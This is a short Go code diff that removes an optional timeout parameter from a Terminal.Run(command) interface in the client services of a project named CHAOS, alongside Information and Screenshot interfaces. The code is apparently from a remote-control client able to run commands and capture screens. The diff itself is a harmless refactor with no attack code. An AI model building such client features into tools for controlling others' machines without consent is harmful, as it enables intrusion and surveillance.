@@ -3,7 +3,6 @@ package services
 import (
 	"errors"
 	"github.com/tiagorlampert/CHAOS/client/app/entities"
-	"time"
 )
 
 var (
@@ -28,7 +27,7 @@ type Information interface {
 }
 
 type Terminal interface {
-	Run(command string, timeout ...time.Duration) ([]byte, error)
+	Run(command string) ([]byte, error)
 }
 
 type Screenshot interface {
